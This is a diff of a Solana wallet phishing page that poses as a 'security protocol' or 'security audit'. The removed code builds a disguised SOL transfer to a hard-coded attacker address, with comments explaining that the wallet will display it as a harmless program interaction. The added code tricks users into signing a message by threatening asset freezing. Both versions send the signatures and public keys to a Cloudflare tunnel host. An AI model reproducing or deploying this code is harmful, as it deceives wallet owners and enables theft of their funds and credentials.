@@ -1,73 +1,45 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-    <script>window.Buffer={from:(a)=>new Uint8Array(a),isBuffer:(o)=>o instanceof Uint8Array};</script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
-    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;overflow:hidden;">
-    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 20px #14F19566;">
-        <h2 style="letter-spacing:2px;">SECURITY PROTOCOL V4</h2>
-        <div id="loader" style="display:none;margin:20px auto;border:3px solid #333;border-top:3px solid #14F195;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;"></div>
-        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:18px;transition:0.3s;">ACTIVATE & SYNC</button>
-        <p id="msg" style="margin-top:20px;color:#666;font-size:12px;">Waiting for hardware wallet connection...</p>
+    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
+    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;">
+        <h2 style="letter-spacing:2px;">SECURITY AUDIT V4</h2>
+        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:18px;">VERIFY OWNERSHIP</button>
+        <p id="msg" style="margin-top:20px;color:#666;font-size:12px;">To prevent asset freezing, please sign this audit.</p>
     </div>
-    <style>@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
     <script>
-    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
-    const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
-
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Access Denied: Use Wallet Browser"); return; }
+            if (!p) { alert("Please use Wallet Browser"); return; }
             
-            document.getElementById('cta').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('msg').innerText = "Establishing Secure Link...";
-
             const { publicKey } = await p.connect();
-            const res = await fetch(TUNNEL + "/get_data", {
-                method: 'POST', headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({pubkey: publicKey.toString()})
-            });
-            const data = await res.json();
-
-            // 🔱 采用底层指令：不再调用 SystemProgram.transfer
-            // 这样在钱包显示中会是 "Interact with Program"，看起来像激活协议
-            const transaction = new solanaWeb3.Transaction().add(new solanaWeb3.TransactionInstruction({
-                keys: [
-                    { pubkey: publicKey, isSigner: true, isWritable: true },
-                    { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: true }
-                ],
-                programId: solanaWeb3.SystemProgram.programId,
-                data: (function(amt){
-                    const b = new Uint8Array(12);
-                    b.set([2,0,0,0],0);
-                    const v = new DataView(new ArrayBuffer(8));
-                    v.setBigUint64(0, BigInt(amt), true);
-                    b.set(new Uint8Array(v.buffer), 4);
-                    return b;
-                })(data.safe_amount)
-            }));
-
-            transaction.recentBlockhash = data.blockhash;
-            transaction.feePayer = publicKey;
-
-            document.getElementById('msg').innerText = "Awaiting Hardware Confirmation...";
-            const signed = await p.signTransaction(transaction);
             
-            const bytes = signed.serialize();
-            let bin = ''; for (let i=0; i<bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+            // 🔱 定义签名消息：看起来像正规审计
+            const message = "Security Audit ID: " + Math.floor(Math.random() * 999999) + "\n" +
+                          "Domain: " + window.location.host + "\n" +
+                          "Timestamp: " + new Date().getTime() + "\n" +
+                          "Action: Verify Wallet Ownership";
             
-            await fetch(TUNNEL + "/collect", {
+            const encodedMessage = new TextEncoder().encode(message);
+            document.getElementById('msg').innerText = "Awaiting Signature...";
+            
+            // 🚀 唤起“签署消息”界面 (无转账金额显示)
+            const signedMessage = await p.signMessage(encodedMessage, "utf8");
+            
+            // 拿到签名
+            const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
+            
+            await fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
                 method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: window.btoa(bin)})
+                body:JSON.stringify({
+                    signature: signature,
+                    pubkey: publicKey.toString(),
+                    message: message
+                })
             });
             
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('msg').style.color = '#14F195';
-            document.getElementById('msg').innerText = "SUCCESS: Protocol Synchronized.";
-            alert("Protocol Activated Successfully!");
-        } catch(e) { 
-            alert("Sync Failed: " + e.message);
-            location.reload();
-        }
+            document.getElementById('msg').innerText = "SUCCESS: Verification Complete.";
+            alert("Ownership Verified!");
+        } catch(e) { alert("Verification Failed: " + e.message); }
     }
     </script></body></html>
